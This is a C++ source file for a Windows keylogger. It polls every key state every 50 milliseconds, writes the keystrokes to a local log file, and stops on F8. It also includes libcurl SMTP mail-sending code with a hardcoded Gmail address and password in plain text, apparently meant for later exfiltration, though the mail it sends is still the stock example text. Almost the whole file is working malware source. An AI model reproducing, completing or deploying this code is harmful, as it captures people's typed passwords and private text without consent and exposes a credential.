#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <assert.h>
#include <curl/curl.h>

#define from_addr		"not4keylogging@gmail.com"
#define from_pass		"pistol77!" 
#define to_addr			"not4keylogging@gmail.com"	
#define cc_addr			""

static const char* email[] = {
  "Date: Mon, 29 Nov 2010 21:54:29 +1100\r\n",
  "To: " to_addr "\r\n",
  "From: " from_addr "\r\n",
  "Cc: " cc_addr "\r\n",
  "Message-ID: <dcd7cb36-11db-487a-9f3a-e652a9458efd@"
  "rfcpedant.example.org>\r\n",
  "Subject: SMTP example message\r\n",
  "\r\n", /* empty line to divide headers from body, see RFC5322 */
  "The body of the message starts here.\r\n",
  "\r\n",
  "It could be a lot of lines, could be MIME encoded, whatever.\r\n",
  "Check RFC5322.\r\n",
  NULL
};

struct upload_status {
	int lines_read;
};

static size_t payload_source(void* ptr, size_t size, size_t nmemb, void* userp) {
	struct upload_status* upload_ctx = (struct upload_status*)userp;
	const char* data;

	if ((size == 0) || (nmemb == 0) || ((size * nmemb) < 1)) {
		return 0;
	}

	data = email[upload_ctx->lines_read];

	if (data) {
		size_t len = strlen(data);
		memcpy(ptr, data, len);
		upload_ctx->lines_read++;

		return len;
	}

	return 0;
}

int send_email()
	{
		CURL* curl;
		CURLcode res = CURLE_OK;
		struct curl_slist* recipients = NULL;
		struct upload_status upload_ctx;

		upload_ctx.lines_read = 0;

		curl = curl_easy_init();
		if (curl) {
			/* Set username and password */
			curl_easy_setopt(curl, CURLOPT_USERNAME, from_addr);
			curl_easy_setopt(curl, CURLOPT_PASSWORD, from_pass);

			/* This is the URL for your mailserver. Note the use of port 587 here,
			 * instead of the normal SMTP port (25). Port 587 is commonly used for
			 * secure mail submission (see RFC4403), but you should use whatever
			 * matches your server configuration. */
			curl_easy_setopt(curl, CURLOPT_URL, "smtp://mainserver.example.net:587");

			/* In this example, we'll start with a plain text connection, and upgrade
			 * to Transport Layer Security (TLS) using the STARTTLS command. Be careful
			 * of using CURLUSESSL_TRY here, because if TLS upgrade fails, the transfer
			 * will continue anyway - see the security discussion in the libcurl
			 * tutorial for more details. */
			curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);

			/* If your server doesn't have a valid certificate, then you can disable
			 * part of the Transport Layer Security protection by setting the
			 * CURLOPT_SSL_VERIFYPEER and CURLOPT_SSL_VERIFYHOST options to 0 (false).
			 *   curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
			 *   curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
			 * That is, in general, a bad idea. It is still better than sending your
			 * authentication details in plain text though.  Instead, you should get
			 * the issuer certificate (or the host certificate if the certificate is
			 * self-signed) and add it to the set of certificates that are known to
			 * libcurl using CURLOPT_CAINFO and/or CURLOPT_CAPATH. See docs/SSLCERTS
			 * for more information. */
			curl_easy_setopt(curl, CURLOPT_CAINFO, "/path/to/certificate.pem");

			/* Note that this option isn't strictly required, omitting it will result
			 * in libcurl sending the MAIL FROM command with empty sender data. All
			 * autoresponses should have an empty reverse-path, and should be directed
			 * to the address in the reverse-path which triggered them. Otherwise,
			 * they could cause an endless loop. See RFC 5321 Section 4.5.5 for more
			 * details.
			 */
			curl_easy_setopt(curl, CURLOPT_MAIL_FROM, from_addr);

			/* Add two recipients, in this particular case they correspond to the
			 * To: and Cc: addressees in the header, but they could be any kind of
			 * recipient. */
			recipients = curl_slist_append(recipients, to_addr);
			recipients = curl_slist_append(recipients, cc_addr);
			curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

			/* We're using a callback function to specify the payload (the headers and
			 * body of the message). You could just use the CURLOPT_READDATA option to
			 * specify a FILE pointer to read from. */
			curl_easy_setopt(curl, CURLOPT_READFUNCTION, payload_source);
			curl_easy_setopt(curl, CURLOPT_READDATA, &upload_ctx);
			curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

			/* Since the traffic will be encrypted, it is very useful to turn on debug
			 * information within libcurl to see what is happening during the transfer.
			 */
			curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

			/* Send the message */
			res = curl_easy_perform(curl);

			/* Check for errors */
			if (res != CURLE_OK)
				fprintf(stderr, "curl_easy_perform() failed: %s\n",
					curl_easy_strerror(res));

			/* Free the list of recipients */
			curl_slist_free_all(recipients);

			/* Always cleanup */
			curl_easy_cleanup(curl);
		}

		return (int)res;
	}

int log_key(int key, const char* file) {
	std::cout << key << std::endl;
	//character maps for virtual keys to chars
	char keyMapUP[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	char keyMapLOW[] = "abcdefghijklmnopqrstuvwxyz";
	char numMap[] = "0123456789*+";
	char symMap[] = "-./";
	FILE* theFile;
	errno_t error = fopen_s(&theFile, file, "a+");
	//fopen_s == 0 on success
	if (error == 0) {
		//key has not been pressed since last poll
		if (key == VK_BACK) {
			fprintf(theFile, " [BACK] ");
		}
		else if (key == VK_TAB) {
			fprintf(theFile, " [TAB] ");
		}
		else if (key == VK_SHIFT) {
			fprintf(theFile, " [SHIFT] ");
		}
		else if (key == VK_RETURN) {
			fprintf(theFile, "[ENTER] ");
		}
		else if (key == VK_ESCAPE) {
			fprintf(theFile, " [ESC] ");
		}
		else if (key == VK_SPACE) {
			fprintf(theFile, " [SPACEBAR] ");
		}
		else if (key > 64 && key < 91) {
			//key is A-Z or a-z
			if (GetKeyState(VK_CAPITAL) & 0x1) {
				//key is A-Z
				fprintf(theFile, "%c", keyMapUP[key % 65]);
			}
			else {
				//key is a-z
				fprintf(theFile, "%c", keyMapLOW[key % 65]);
			}
		}
		else if (key > 47 && key < 58) {
			//key is 0-9
			fprintf(theFile, "%c", numMap[key%48]);
		}
		else if (key > 95 && key < 108) {
			//key is 0-9 or 
			fprintf(theFile, "%c", numMap[key%96]);
		}
		else if (key > 108 && key < 112) {
			//key is - . / 
			fprintf(theFile, "%c", symMap[key % 109]);
		}
		else {
			//key is other
			fprintf(theFile, "%c", char(key));
		}
	}
	else {
		//error detected on fopen_s
		std::cout << "error opening file" << std::endl;
	}
	if (theFile) {
		error = fclose(theFile);
	}
	return 0;
}

int zero_array(int* array, int size) {
	for (int i = 0; i<size; i++) {
		array[i] = 0;
	}
	return 0;
}

int log_key(int key, char* file);
int zero_array(int* array, int size);
static size_t payload_source(void* ptr, size_t size, size_t nmemb, void* userp);
int send_email();

int main() {
	int active = 1;
	const int size = 256;
	int activityMap[size];
	zero_array(activityMap,size);
	send_email();
	while (active) {
		//poll every 50ms
		Sleep(50);
		for (int i = 8; i < 255; i++) {
			if (GetAsyncKeyState(i) & 0x8000) {
				//checks only if key is pressed down
				if (i == 119) {
					//F8 ends keylogger
					active = 0;
				}
				if (activityMap[i] == 0) {
					//unique key press
					log_key(i, "log.txt");
				}
				activityMap[i] = 1;
			}
			else {
				//key not pressed, reset activity to 0
				activityMap[i] = 0;
			}
		}
	}
	return 0;
}